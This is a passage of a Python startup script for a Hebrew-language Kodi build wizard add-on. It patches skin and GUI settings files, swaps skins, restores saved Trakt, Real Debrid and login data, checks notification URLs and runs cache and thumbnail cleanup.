			file_data= file.read()
			file.close()
			regex='<import addon="xbmc.gui" version="5.14.0(.+?)/>'
			m=re.compile(regex).findall(file_data)[0]
			file = open(setting_file, 'w') 
			file.write(file_data.replace('<import addon="xbmc.gui" version="5.14.0%s/>'%m,'<import addon="xbmc.gui" version="5.12.0"/>'))
			file.close()
		except:
				pass
		wiz.kodi17Fix()
		setting_file=os.path.join(xbmc.translatePath("special://userdata"),"guisettings.xml")
		try:
			file = open(setting_file, 'r') 
			file_data= file.read()
			file.close()
			regex='<keyboardlayouts default="true(.+?)/keyboardlayouts>'
			m=re.compile(regex).findall(file_data)[0]
			file = open(setting_file, 'w') 
			file.write(file_data.replace('<keyboardlayouts default="true%s/keyboardlayouts>'%m,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))
			file.close()
		except:
				pass
		swapSkins('skin.Premium.mod')
	xbmcgui.Dialog().ok("Kodi EA Fix", 'גירסת הקודי אינה תואמת את גירסת הבילד, לתיקון הבעיה נא ללחוץ אישור. הקודי יסגר לאחר הפעולה.')
	os._exit(1)
def fix18update():
	if KODIV>=18:
		xbmc.sleep(4000)
		if BUILDNAME == "":
			try:
				os.remove(os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos116.db"))
			except:
				pass
		try:
			old_file = os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos107.db")
			new_file = os.path.join(xbmc.translatePath("special://userdata/"),"Database", "MyVideos116.db")
			os.rename(old_file, new_file)
		except:
				pass
		skindialogsettind18()
		xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')
		xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')
		fixfont()
		setting_file=os.path.join(xbmc.translatePath("special://home/"),"addons", "skin.Premium.mod","addon.xml")
		try:
			file = open(setting_file, 'r') 
			file_data= file.read()
			file.close()
			regex='<import addon="xbmc.gui" version="5.12.0(.+?)/>'
			m=re.compile(regex).findall(file_data)[0]
			file = open(setting_file, 'w') 
			file.write(file_data.replace('<import addon="xbmc.gui" version="5.12.0%s/>'%m,'<import addon="xbmc.gui" version="5.14.0"/>'))
			file.close()
		except:
				pass
		wiz.kodi17Fix()
		setting_file=os.path.join(xbmc.translatePath("special://userdata"),"guisettings.xml")
		try:
			file = open(setting_file, 'r') 
			file_data= file.read()
			file.close()
			regex='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'
			m=re.compile(regex).findall(file_data)[0]
			file = open(setting_file, 'w') 
			file.write(file_data.replace('<setting id="locale.keyboardlayouts" default="true%s/setting>'%m,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))
			file.close()
		except:
				pass
		swapSkins('skin.Premium.mod')
	xbmcgui.Dialog().ok("Kodi EA Fix", 'גירסת הקודי אינה תואמת את גירסת הבילד, לתיקון הבעיה נא ללחוץ אישור. הקודי יסגר לאחר הפעולה.')
	os._exit(1)
def swapSkins(skin, title="Error"):
	old = 'lookandfeel.skin'
	value = skin
	current = getOld(old)
	new = old
	setNew(new, value)
	x = 0
	while not xbmc.getCondVisibility("Window.isVisible(yesnodialog)") and x < 100:
		x += 1
		xbmc.sleep(1)
	if xbmc.getCondVisibility("Window.isVisible(yesnodialog)"):
		xbmc.executebuiltin('SendClick(11)')
	return True

def getOld(old):
	try:
		old = '"%s"' % old 
		query = '{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}' % (old)
		
		response = xbmc.executeJSONRPC(query)
		response = simplejson.loads(response)
		if response.has_key('result'):
			if response['result'].has_key('value'):
				return response ['result']['value'] 
	except:
		pass
	return None
    
    
def setNew(new, value):
	try:
		new = '"%s"' % new
		value = '"%s"' % value
		query = '{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}' % (new, value)

		response = xbmc.executeJSONRPC(query)
	except:
		pass
	return None    
def idle():
	return xbmc.executebuiltin('Dialog.Close(busydialog)')
def fixfont():
	req =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')

	jsonRPCRes = json.loads(req);
	settingsList = jsonRPCRes["result"]["settings"]

	audioSetting =  [item for item in settingsList if item["id"] ==  "audiooutput.audiodevice"][0]
	audioDeviceOptions = audioSetting["options"];
	activeAudioDeviceValue = audioSetting["value"];

	activeAudioDeviceId = [index for (index, option) in enumerate(audioDeviceOptions) if option["value"] == activeAudioDeviceValue][0];

	nextIndex = ( activeAudioDeviceId + 1 ) % len(audioDeviceOptions)

	nextValue = audioDeviceOptions[nextIndex]["value"]
	nextName = audioDeviceOptions[nextIndex]["label"]

	changeReq =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}' )

	try:
		changeResJson = json.loads(changeReq);

		if changeResJson["result"] != True:
			raise Exception
	except:
		sys.stderr.write("Error switching audio output device")
		raise Exception


def checkSkin():
	wiz.log("[Build Check] Invalid Skin Check Start")
	DEFAULTSKIN   = wiz.getS('defaultskin')
	DEFAULTNAME   = wiz.getS('defaultskinname')
	DEFAULTIGNORE = wiz.getS('defaultskinignore')
	gotoskin = False
	if not DEFAULTSKIN == '':
		if os.path.exists(os.path.join(ADDONS, DEFAULTSKIN)):
			if DIALOG.yesno(ADDONTITLE, "[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]" % (COLOR2, COLOR1, SKIN[5:].title()), "Would you like to set the skin back to:[/COLOR]", '[COLOR %s]%s[/COLOR]' % (COLOR1, DEFAULTNAME)):
				gotoskin = DEFAULTSKIN
				gotoname = DEFAULTNAME
			else: wiz.log("Skin was not reset", xbmc.LOGNOTICE); wiz.setS('defaultskinignore', 'true'); gotoskin = False
		else: wiz.setS('defaultskin', ''); wiz.setS('defaultskinname', ''); DEFAULTSKIN = ''; DEFAULTNAME = ''
	if DEFAULTSKIN == '':
		skinname = []
		skinlist = []
		for folder in glob.glob(os.path.join(ADDONS, 'skin.*/')):
			xml = "%s/addon.xml" % folder
			if os.path.exists(xml):
				f  = open(xml,mode='r'); g = f.read().replace('\n','').replace('\r','').replace('\t',''); f.close();
				match  = wiz.parseDOM(g, 'addon', ret='id')
				match2 = wiz.parseDOM(g, 'addon', ret='name')
				wiz.log("%s: %s" % (folder, str(match[0])), xbmc.LOGNOTICE)
				if len(match) > 0: skinlist.append(str(match[0])); skinname.append(str(match2[0]))
				else: wiz.log("ID not found for %s" % folder, xbmc.LOGNOTICE)
			else: wiz.log("ID not found for %s" % folder, xbmc.LOGNOTICE)
		if len(skinlist) > 0:
			if len(skinlist) > 1:
				if DIALOG.yesno(ADDONTITLE, "[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]" % (COLOR2, COLOR1, SKIN[5:].title()), "Would you like to view a list of avaliable skins?[/COLOR]"):
					choice = DIALOG.select("Select skin to switch to!", skinname)
					if choice == -1: wiz.log("Skin was not reset", xbmc.LOGNOTICE); wiz.setS('defaultskinignore', 'true')
					else: 
						gotoskin = skinlist[choice]
						gotoname = skinname[choice]
				else: wiz.log("Skin was not reset", xbmc.LOGNOTICE); wiz.setS('defaultskinignore', 'true')
			# else:
				# if DIALOG.yesno(ADDONTITLE, "[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]" % (COLOR2, COLOR1, SKIN[5:].title()), "Would you like to set the skin back to:[/COLOR]", '[COLOR %s]%s[/COLOR]' % (COLOR1, skinname[0])):
					# gotoskin = skinlist[0]
					# gotoname = skinname[0]
				# else: wiz.log("Skin was not reset", xbmc.LOGNOTICE); wiz.setS('defaultskinignore', 'true')
		# else: wiz.log("No skins found in addons folder.", xbmc.LOGNOTICE); wiz.setS('defaultskinignore', 'true'); gotoskin = False
	if gotoskin:
		skinSwitch.swapSkins(gotoskin)
		x = 0
		xbmc.sleep(1000)
		while not xbmc.getCondVisibility("Window.isVisible(yesnodialog)") and x < 150:
			x += 1
			xbmc.sleep(200)

		if xbmc.getCondVisibility("Window.isVisible(yesnodialog)"):
			wiz.ebi('SendClick(11)')
			wiz.lookandFeelData('restore')
		else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]Skin Swap Timed Out![/COLOR]' % COLOR2)
	wiz.log("[Build Check] Invalid Skin Check End", xbmc.LOGNOTICE)

while xbmc.Player().isPlayingVideo():
	xbmc.sleep(1000)

if KODIV >= 17:
	NOW = datetime.now()
	temp = wiz.getS('kodi17iscrap')
	if not temp == '':
		if temp > str(NOW - timedelta(minutes=2)):
			wiz.log("Killing Start Up Script")
			sys.exit()
	wiz.log("%s" % (NOW))
	wiz.setS('kodi17iscrap', str(NOW))
	xbmc.sleep(1000)
	if not wiz.getS('kodi17iscrap') == str(NOW):
		wiz.log("Killing Start Up Script")
		sys.exit()
	else:
		wiz.log("Continuing Start Up Script")

wiz.log("[Path Check] Started", xbmc.LOGNOTICE)
path = os.path.split(ADDONPATH)
if not ADDONID == path[1]: DIALOG.ok(ADDONTITLE, '[COLOR %s]Please make sure that the plugin folder is the same as the ADDON_ID.[/COLOR]' % COLOR2, '[COLOR %s]Plugin ID:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, ADDONID), '[COLOR %s]Plugin Folder:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, path)); wiz.log("[Path Check] ADDON_ID and plugin folder doesnt match. %s / %s " % (ADDONID, path))
else: wiz.log("[Path Check] Good!", xbmc.LOGNOTICE)


if KODIADDONS in ADDONPATH:
	wiz.log("Copying path to addons dir", xbmc.LOGNOTICE)
	if not os.path.exists(ADDONS): os.makedirs(ADDONS)
	newpath = xbmc.translatePath(os.path.join('special://home/addons/', ADDONID))
	if os.path.exists(newpath):
		wiz.log("Folder already exists, cleaning House", xbmc.LOGNOTICE)
		wiz.cleanHouse(newpath)
		wiz.removeFolder(newpath)
	try:
		wiz.copytree(ADDONPATH, newpath)
	except Exception as e:
		pass
	wiz.forceUpdate(True)

try:
	mybuilds = xbmc.translatePath(MYBUILDS)
	if not os.path.exists(mybuilds): xbmcvfs.mkdirs(mybuilds)
except:
	pass

wiz.log("[Installed Check] Started", xbmc.LOGNOTICE)
#if INSTALLED == 'false':
#	if KODIV >= 17 and SKIN in ['skin.confluence', 'skin.estuary'] and BUILDNAME == '':
#			swapSkins('skin.Premium.mod')
if KODIV >= 17 and SKIN in ['skin.confluence', 'skin.estuary', 'skin.estouchy'] and not BUILDNAME == "":
			wiz.kodi17Fix()
			fix18update()
			fix17update()
            
            
if INSTALLED == 'true':
    input= (ADDON.getSetting("auto_rd"))
           
    if KEEPTRAKT == 'true': traktit.traktIt('restore', 'all'); wiz.log('[Installed Check] Restoring Trakt Data', xbmc.LOGNOTICE)
    if KEEPREAL  == 'true': debridit.debridIt('restore', 'all'); wiz.log('[Installed Check] Restoring Real Debrid Data', xbmc.LOGNOTICE)
    if input == 'true': loginit.loginIt('restore', 'all'); wiz.log('[Installed Check] Restoring Login Data', xbmc.LOGNOTICE)
    wiz.clearS('install')

#if INSTALLED == 'false':
#	if KODIV >= 17:
#		wiz.kodi17Fix()
#		if SKIN in ['skin.confluence', 'skin.estuary']:
#			checkSkin()
#			swapSkins('skin.Premium.mod')
#		FAILED = True
#	elif not EXTRACT == '100' and not BUILDNAME == "":
#		wiz.log("[Installed Check] Build was extracted %s/100 with [ERRORS: %s]" % (EXTRACT, EXTERROR), xbmc.LOGNOTICE)
#		yes=DIALOG.yesno(ADDONTITLE, '[COLOR %s]%s[/COLOR] [COLOR %s]was not installed correctly!' % (COLOR1, COLOR2, BUILDNAME), 'Installed: [COLOR %s]%s[/COLOR] / Error Count: [COLOR %s]%s[/COLOR]' % (COLOR1, EXTRACT, COLOR1, EXTERROR), 'Would you like to try again?[/COLOR]', nolabel='[B]No Thanks![/B]', yeslabel='[B]Retry Install[/B]')
#		wiz.clearS('build')
#		FAILED = True
#		if yes: 
#			wiz.ebi("PlayMedia(plugin://%s/?mode=install&name=%s&url=fresh)" % (ADDON_ID, urllib.quote_plus(BUILDNAME)))
#			wiz.log("[Installed Check] Fresh Install Re-activated", xbmc.LOGNOTICE)
#		else: wiz.log("[Installed Check] Reinstall Ignored")
#	elif SKIN in ['skin.confluence', 'skin.estuary']:
#		wiz.log("[Installed Check] Incorrect skin: %s" % SKIN, xbmc.LOGNOTICE)
#		defaults = wiz.getS('defaultskin')
#		if not defaults == '':
#			if os.path.exists(os.path.join(ADDONS, defaults)):
#				skinSwitch.swapSkins(defaults)
#				x = 0
#				xbmc.sleep(1000)
#				while not xbmc.getCondVisibility("Window.isVisible(yesnodialog)") and x < 150:
#					x += 1
#					xbmc.sleep(200)

#				if xbmc.getCondVisibility("Window.isVisible(yesnodialog)"):
#					wiz.ebi('SendClick(11)')
#					wiz.lookandFeelData('restore')
#		if not wiz.currSkin() == defaults and not BUILDNAME == "":
#			gui = wiz.checkBuild(BUILDNAME, 'gui')
#			FAILED = True
#			if gui == 'http://':
#				wiz.log("[Installed Check] Guifix was set to http://", xbmc.LOGNOTICE)
#				DIALOG.ok(ADDONTITLE, "[COLOR %s]It looks like the skin settings was not applied to the build." % COLOR2, "Sadly no gui fix was attatched to the build", "You will need to reinstall the build and make sure to do a force close[/COLOR]")
#			elif wiz.workingURL(gui):
#				yes=DIALOG.yesno(ADDONTITLE, '%s was not installed correctly!' % BUILDNAME, 'It looks like the skin settings was not applied to the build.', 'Would you like to apply the GuiFix?', nolabel='[B]No, Cancel[/B]', yeslabel='[B]Apply Fix[/B]')
#				if yes: wiz.ebi("PlayMedia(plugin://%s/?mode=install&name=%s&url=gui)" % (ADDON_ID, urllib.quote_plus(BUILDNAME))); wiz.log("[Installed Check] Guifix attempting to install")
#				else: wiz.log('[Installed Check] Guifix url working but cancelled: %s' % gui, xbmc.LOGNOTICE)
#			else:
#				DIALOG.ok(ADDONTITLE, "[COLOR %s]It looks like the skin settings was not applied to the build." % COLOR2, "Sadly no gui fix was attatched to the build", "You will need to reinstall the build and make sure to do a force close[/COLOR]")
#				wiz.log('[Installed Check] Guifix url not working: %s' % gui, xbmc.LOGNOTICE)
#	else:
#		wiz.log('[Installed Check] Install seems to be completed correctly', xbmc.LOGNOTICE)
#	if not wiz.getS('pvrclient') == "":
#		wiz.toggleAddon(wiz.getS('pvrclient'), 1)
#		wiz.ebi('StartPVRManager')
#	wiz.addonUpdates('reset')
#	if KEEPTRAKT == 'true': traktit.traktIt('restore', 'all'); wiz.log('[Installed Check] Restoring Trakt Data', xbmc.LOGNOTICE)
#	if KEEPREAL  == 'true': debridit.debridIt('restore', 'all'); wiz.log('[Installed Check] Restoring Real Debrid Data', xbmc.LOGNOTICE)
#	if KEEPLOGIN == 'true': loginit.loginIt('restore', 'all'); wiz.log('[Installed Check] Restoring Login Data', xbmc.LOGNOTICE)
#	wiz.clearS('install')
#else: wiz.log("[Installed Check] Not Enabled", xbmc.LOGNOTICE)

#if FAILED == False:
#	wiz.log("[Build Check] Started", xbmc.LOGNOTICE)
#	if not WORKING:
#		wiz.log("[Build Check] Not a valid URL for Build File: %s" % SPEEDFILE, xbmc.LOGNOTICE)
#	elif BUILDCHECK == '' and BUILDNAME == '':
#		wiz.log("[Build Check] First Run", xbmc.LOGNOTICE)
#		notify.firstRun()
		#notify.firstRuninstall()
		#xbmc.sleep(500)
		#notify.firstRun()
		#xbmc.sleep(500)
#		wiz.setS('lastbuildcheck', str(NEXTCHECK))
#	elif not BUILDNAME == '':
#		wiz.log("[Build Check] Build Installed", xbmc.LOGNOTICE)
#		if SKIN in ['skin.confluence', 'skin.estuary'] and not DEFAULTIGNORE == 'true':
#			checkSkin()
#			wiz.log("[Build Check] Build Installed: Checking Updates", xbmc.LOGNOTICE)
#			wiz.setS('lastbuildcheck', str(NEXTCHECK))
#			checkUpdate()
#		elif BUILDCHECK <= str(TODAY):
#			wiz.log("[Build Check] Build Installed: Checking Updates", xbmc.LOGNOTICE)
#			wiz.setS('lastbuildcheck', str(NEXTCHECK))
#			checkUpdate()
#		else: 
#			wiz.log("[Build Check] Build Installed: Next check isnt until: %s / TODAY is: %s" % (BUILDCHECK, str(TODAY)), xbmc.LOGNOTICE)


wiz.log("[Notifications] Started", xbmc.LOGNOTICE)
#if ENABLE == 'Yes' and not BUILDNAME == " ":
if ENABLE == 'Yes' and BUILDNAME == " EAbuilds ":
	input= (ADDON.getSetting("autoupdate"))
	STARTP2()
	if not NOTIFY == 'true':
		url = wiz.workingURL(NOTIFICATION)
		if url == True:
			id, msg = wiz.splitNotify(NOTIFICATION)
			if not id == False:
				try:
					id = int(id); NOTEID = int(NOTEID)
					if id == NOTEID:
						if NOTEDISMISS == 'false':
							debridit.debridIt('update', 'all')
							traktit.traktIt('update', 'all')
							checkidupdate()# notify.notification(msg)
						else: wiz.log("[Notifications] id[%s] Dismissed" % int(id), xbmc.LOGNOTICE)
					elif id > NOTEID:
						wiz.log("[Notifications] id: %s" % str(id), xbmc.LOGNOTICE)
						wiz.setS('noteid', str(id))
						wiz.setS('notedismiss', 'false')
						if input == 'true':
							debridit.debridIt('update', 'all')
							traktit.traktIt('update', 'all')
							checkidupdate()
						else: notify.notification(msg=msg)
						wiz.log("[Notifications] Complete", xbmc.LOGNOTICE)
				except Exception as e:
					wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
			else: wiz.log("[Notifications] Text File not formated Correctly")
		else: wiz.log("[Notifications] URL(%s): %s" % (NOTIFICATION, url), xbmc.LOGNOTICE)
	else: wiz.log("[Notifications] Turned Off", xbmc.LOGNOTICE)
else: wiz.log("[Notifications] Not Enabled", xbmc.LOGNOTICE)

wiz.log("[Notifications2] Started", xbmc.LOGNOTICE)
if ENABLE == 'No':
	if not NOTIFY2 == 'true':
		url = wiz.workingURL(NOTIFICATION2)
		if url == True:
			id, msg = wiz.splitNotify(NOTIFICATION2)
			if not id == False:
				try:
					id = int(id); NOTEID2 = int(NOTEID2)
					if id == NOTEID2:
						if NOTEDISMISS2 == 'false':
							checkvictory()
						else: wiz.log("[Notifications2] id[%s] Dismissed" % int(id), xbmc.LOGNOTICE)
					elif id > NOTEID2:
						wiz.log("[Notifications2] id: %s" % str(id), xbmc.LOGNOTICE)
						wiz.setS('noteid2', str(id))
						wiz.setS('notedismiss2', 'false')
						checkvictory()
						wiz.log("[Notifications2] Complete", xbmc.LOGNOTICE)
				except Exception as e:
					wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
			else: wiz.log("[Notifications2] Text File not formated Correctly")
		else: wiz.log("[Notifications2] URL(%s): %s" % (NOTIFICATION2, url), xbmc.LOGNOTICE)
	else: wiz.log("[Notifications2] Turned Off", xbmc.LOGNOTICE)
else: wiz.log("[Notifications2] Not Enabled", xbmc.LOGNOTICE)

wiz.log("[Notifications3] Started", xbmc.LOGNOTICE)
if ENABLE == 'Yes' and BUILDNAME == " EAbuilds " or BUILDNAME == " EAbuilds ":
	if not NOTIFY3 == 'true':
		url = wiz.workingURL(NOTIFICATION3)
		if url == True:
			id, msg = wiz.splitNotify(NOTIFICATION3)
			if not id == False:
				try:
					id = int(id); NOTEID3 = int(NOTEID3)
					if id == NOTEID3:
						if NOTEDISMISS3 == 'false':
							notify.notification3(msg)
						else: wiz.log("[Notifications3] id[%s] Dismissed" % int(id), xbmc.LOGNOTICE)
					elif id > NOTEID3:
						wiz.log("[Notifications3] id: %s" % str(id), xbmc.LOGNOTICE)
						wiz.setS('noteid3', str(id))
						wiz.setS('notedismiss3', 'false')
						notify.notification3(msg=msg)
						wiz.log("[Notifications3] Complete", xbmc.LOGNOTICE)
				except Exception as e:
					wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
			else: wiz.log("[Notifications3] Text File not formated Correctly")
		else: wiz.log("[Notifications3] URL(%s): %s" % (NOTIFICATION3, url), xbmc.LOGNOTICE)
	else: wiz.log("[Notifications3] Turned Off", xbmc.LOGNOTICE)
else: wiz.log("[Notifications3] Not Enabled", xbmc.LOGNOTICE)
wiz.log("[Trakt Data] Started", xbmc.LOGNOTICE)
if KEEPTRAKT == 'true':
	if TRAKTSAVE <= str(TODAY):
		wiz.log("[Trakt Data] Saving all Data", xbmc.LOGNOTICE)
		traktit.autoUpdate('all')
		wiz.setS('traktlastsave', str(THREEDAYS))
	else: 
		wiz.log("[Trakt Data] Next Auto Save isnt until: %s / TODAY is: %s" % (TRAKTSAVE, str(TODAY)), xbmc.LOGNOTICE)
else: wiz.log("[Trakt Data] Not Enabled", xbmc.LOGNOTICE)

wiz.log("[Real Debrid Data] Started", xbmc.LOGNOTICE)
if KEEPREAL == 'true':
	if REALSAVE <= str(TODAY):
		wiz.log("[Real Debrid Data] Saving all Data", xbmc.LOGNOTICE)
		debridit.autoUpdate('all')
		wiz.setS('debridlastsave', str(THREEDAYS))
	else: 
		wiz.log("[Real Debrid Data] Next Auto Save isnt until: %s / TODAY is: %s" % (REALSAVE, str(TODAY)), xbmc.LOGNOTICE)
else: wiz.log("[Real Debrid Data] Not Enabled", xbmc.LOGNOTICE)

wiz.log("[Login Data] Started", xbmc.LOGNOTICE)
if KEEPLOGIN == 'true':
	if LOGINSAVE <= str(TODAY):
		wiz.log("[Login Data] Saving all Data", xbmc.LOGNOTICE)
		loginit.autoUpdate('all')
		wiz.setS('loginlastsave', str(THREEDAYS))
	else: 
		wiz.log("[Login Data] Next Auto Save isnt until: %s / TODAY is: %s" % (LOGINSAVE, str(TODAY)), xbmc.LOGNOTICE)
else: wiz.log("[Login Data] Not Enabled", xbmc.LOGNOTICE)

wiz.log("[Auto Clean Up] Started", xbmc.LOGNOTICE)
if AUTOCLEANUP == 'true':
	service = False
	days = [TODAY, TOMORROW, THREEDAYS, ONEWEEK]
	feq = int(float(AUTOFEQ))
	if AUTONEXTRUN <= str(TODAY) or feq == 0:
		service = True
		next_run = days[feq]
		wiz.setS('nextautocleanup', str(next_run))
	else: wiz.log("[Auto Clean Up] Next Clean Up %s" % AUTONEXTRUN, xbmc.LOGNOTICE)
	if service == True:
		AUTOCACHE      = wiz.getS('clearcache')
		AUTOPACKAGES   = wiz.getS('clearpackages')
		AUTOTHUMBS     = wiz.getS('clearthumbs')
		if AUTOCACHE == 'true': wiz.log('[Auto Clean Up] Cache: On', xbmc.LOGNOTICE); wiz.clearCache(True)
		else: wiz.log('[Auto Clean Up] Cache: Off', xbmc.LOGNOTICE)
		if AUTOTHUMBS == 'true': wiz.log('[Auto Clean Up] Old Thumbs: On', xbmc.LOGNOTICE); wiz.oldThumbs()
		else: wiz.log('[Auto Clean Up] Old Thumbs: Off', xbmc.LOGNOTICE)
		if AUTOPACKAGES == 'true': wiz.log('[Auto Clean Up] Packages: On', xbmc.LOGNOTICE); wiz.clearPackagesStartup()
		else: wiz.log('[Auto Clean Up] Packages: Off', xbmc.LOGNOTICE)
else: wiz.log('[Auto Clean Up] Turned off', xbmc.LOGNOTICE)

wiz.setS('kodi17iscrap', '')








#import datetime
#def SleepFor(timeS):
#    while((not xbmc.abortRequested) and (timeS > 0)):
#        xbmc.sleep(1000)
#        timeS -= 1

#def SetTimer(delta):
#	return datetime.datetime.now() + datetime.timedelta(seconds=delta)



#SleepFor(1800)
#START=True


#wallInterval = 60*int(ADDON.getSetting('update_int'))

#wallTimer = SetTimer(wallInterval)

#while (not xbmc.abortRequested):
#    timenow = SetTimer(1)

#    if wallTimer < timenow or START:
#        wallTimer = SetTimer(wallInterval)
#        try:
#            if ADDON.getSetting('auto_update_check')=='true' and not xbmc.Player().isPlayingVideo():
#                checkUpdate()
#                wiz.wizardUpdate('startup')
#                if ENABLE == 'Yes' and not BUILDNAME == "":
#                    NOTEID  = wiz.getS('noteid')
#                    NOTEDISMISS    = wiz.getS('notedismiss')
#                    if not NOTIFY == 'true':
#                        url = wiz.workingURL(NOTIFICATION)
#                        if url == True:
#                            id, msg = wiz.splitNotify(NOTIFICATION)
#                            if not id == False:
#                                try:
#                                    id = int(id); NOTEID = int(NOTEID)
#                                    if id == NOTEID:
#                                        if NOTEDISMISS == 'false':
#                                            notify.notification(msg)
#                                        else: wiz.log("[Notifications] id[%s] Dismissed" % int(id), xbmc.LOGNOTICE)
#                                    elif id > NOTEID:
#                                        wiz.log("[Notifications] id: %s" % str(id), xbmc.LOGNOTICE)
#                                        wiz.setS('noteid', str(id))
#                                        wiz.setS('notedismiss', 'false')
#                                        notify.notification(msg=msg)
#                                        wiz.log("[Notifications] Complete", xbmc.LOGNOTICE)
#                                except Exception, e:
#                                    wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
#                            else: wiz.log("[Notifications] Text File not formated Correctly")
#                        else: wiz.log("[Notifications] URL(%s): %s" % (NOTIFICATION, url), xbmc.LOGNOTICE)
#                    else: wiz.log("[Notifications] Turned Off", xbmc.LOGNOTICE)
#                else: wiz.log("[Notifications] Not Enabled", xbmc.LOGNOTICE)
#        except:
#            pass
#
#    START=False
#    xbmc.sleep(50000)
#
for dirpath, dirnames, filenames in os.walk(packagesdir):
	count = 0
	for f in filenames:
		count += 1
		fp = os.path.join(dirpath, f)
		total_size += os.path.getsize(fp)
total_sizetext = "%.0f" % (total_size/1024000.0)
	
#if int(total_sizetext) > filesize:
#	choice2 = xbmcgui.Dialog().yesno("[COLOR=red]Autocleaner[/COLOR]", 'The packages folder is [COLOR red]' + str(total_sizetext) +' MB [/COLOR] - [COLOR red]' + str(count) + '[/COLOR] zip files', 'The folder can be cleaned up without issues to save space...', 'Do you want to clean it now?', yeslabel='Yes',nolabel='No')
#	if choice2 == 1:
#		maintenance.purgePackages()
			
for dirpath2, dirnames2, filenames2 in os.walk(thumbnails):
	for f2 in filenames2:
		fp2 = os.path.join(dirpath2, f2)
		total_size2 += os.path.getsize(fp2)
total_sizetext2 = "%.0f" % (total_size2/1024000.0)

if int(total_sizetext2) > filesize_thumb:
	choice2 = xbmcgui.Dialog().yesno("[COLOR=red]קודי אנונימוס - ניקוי תמונות פוסטרים ישנות[/COLOR]", '[COLOR red]' + str(total_sizetext2) + ' MB  :גודל התיקיה היא [/COLOR]', 'מומלץ למחוק את התיקיה בשביל לפנות מקום נוסף במכשיר', 'האם ברצונך למחוק אותה עכשיו?', yeslabel='כן',nolabel='לא')
	if choice2 == 1:
		maintenance.deleteThumbnails()
		
total_sizetext = "%.0f" % (total_size/1024000.0)
total_sizetext2 = "%.0f" % (total_size2/1024000.0)
	
if notify_mode == 'true': xbmc.executebuiltin('XBMC.Notification(%s, %s, %s, %s)' % ('Maintenance Status',  'Packages: '+ str(total_sizetext) +  ' MB'  ' - Images: ' + str(total_sizetext2) + ' MB' , '5000', iconpath))
time.sleep(3)

if not os.path.exists(os.path.join(ADDONDATA, '4.2.0')) and not BUILDNAME == "":
        display_Votes()
        # xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi EA', 'xxxxx')))
        file = open(os.path.join(ADDONDATA, '4.2.0'), 'w') 
         
        file.write(str('Done'))
        file.close()
if os.path.exists(os.path.join(ADDONS, 'plugin.video.telemedia')):
		tele=xbmcaddon.Addon('plugin.video.telemedia')
if os.path.exists(os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "plugin.video.telemedia/database","td.binlog")):
		tele.setSetting('autologin', 'true')

#STARTP2()
#if auto_clean  == 'true': maintenance.clearCache()